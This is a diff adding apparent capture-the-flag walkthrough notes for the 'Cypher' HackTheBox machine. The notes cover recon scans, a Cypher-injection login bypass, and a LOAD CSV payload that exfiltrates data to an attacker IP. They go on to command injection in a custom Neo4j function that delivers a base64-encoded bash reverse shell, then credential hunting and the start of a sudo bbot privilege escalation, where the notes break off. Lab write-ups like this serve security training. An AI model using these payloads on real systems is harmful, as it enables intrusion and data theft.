@@ -1,0 +1,128 @@
+nmap -sV -sC -vv -oA nmap/cypher ipaddress
+
+gobuster dir -u http://cypher.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out
+
+look at the source code see whats running in the code base 
+
+go to login page and try default credentials 
+
+go to burpsuite
+intercept the credentials request
+
+try to enter a "'" in the username 
+
+example
+
+{"username":"fewfwfw'",
+"password":"admin"
+}
+
+change the username to 
+
+"username":"' or true return 'value' as hash //",
+make the password sha1sum by 
+
+sha1sum = echo -n test | sha1sum
+
+so the value in the username = sha1sum
+and the password becomes test 
+
+{"username":"' or true return 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3' as hash //",
+"password":"test"
+}
+
+example of exfiltrating data from a neo4j database 
+
+{"username":"admin' or true LOAD CSV FROM 'http://10.10.16.4:8000/exfil='+h.value as v return v as hash //",
+"password":"test"}
+
+once logged in
+
+create a query that can grab the users that are connected 
+MATCH (u:USER)-[r]-(connected) RETURN u,r,connected
+also can do "MATCH cred = (u:USER)-[r]-(connected) RETURN cred"
+
+change directory to 
+http://cypher.htb/testing/
+
+download jar file
+extract the jar file 
+7z x custom-apoc-extension-1.0-SNAPSHOT.jar
+
+use jadx for decompiler
+
+jadx $(pwd)/CustomFunctions.class -d $(pwd)/decompile
+
+cd into the end of decompile 
+
+vi CustomFunctions.java
+
+we can do command injection from looking at the CustomFunction.java 
+going to the query, we click on the http statuses and change the search box query to "CALL custom.getUrlStatusCode("http://cypher.htb; echo test")"
+
+
+create a test base64 string 
+echo test | base64 -w0
+
+after creating the base64, we have to see if the search query can decode it 
+by  CALL custom.getUrlStatusCode("http://cypher.htb; echo dGVzdAo=| base64 -d")
+
+and it does decode it 
+
+now we want to create a reverse shell and encode it 
+
+echo -n 'bash -i >& /dev/tcp 10.10.16.4/9001 0>&1' | base64 -w0
+
+This is the output YmFzaCAtaSA+JiAvZGV2L3RjcCAxMC4xMC4xNi40LzkwMDEgMD4mMQ==
+
+whereever there is a special character like a "+", we nee to get rid of it 
+
+so we add extra spaces in the reverse one liner
+
+echo -n 'bash -i  >& /dev/tcp/10.10.16.4/9001  0>&1' | base64 -w0
+
+our new query now becomes "CALL custom.getUrlStatusCode("http://cypher.htb; echo YmFzaCAtaSAgPiYgL2Rldi90Y3AgMTAuMTAuMTYuNC85MDAxICAwPiYx | base64 -d | bash")
+
+start reverse shell listener with nc -lvnp 9001
+
+once the reverse shell is connected, do 
+
+python3 -c 'import pty;pty.spawn("/bin/bash")
+
+CTRL+z
+
+stty -raw echo;fg
+
+enter * 2
+
+cd to home
+
+do a ls -la
+
+cat .bash_history
+
+do a "ps -ef --forest"
+
+ps -ef --forest | less -S
+
+
+we can also do cat /etc/passwd | grep sh$ for users
+
+ssh the user@cypher.htb 
+enter password
+
+in the graphasm ssh,
+so sudo -l 
+and do "cat /usr/local/bin/bbot"
+search github for what bbot is 
+trying to get bbot to get us root access 
+
+trying to do 
+sudo /usr/local/bin/bbot --current-preset-full
+looking for module plugins 
+
+create a preset and modules
+cd /dev/shm
+
+vi pwn.yml
+vi pwn.py
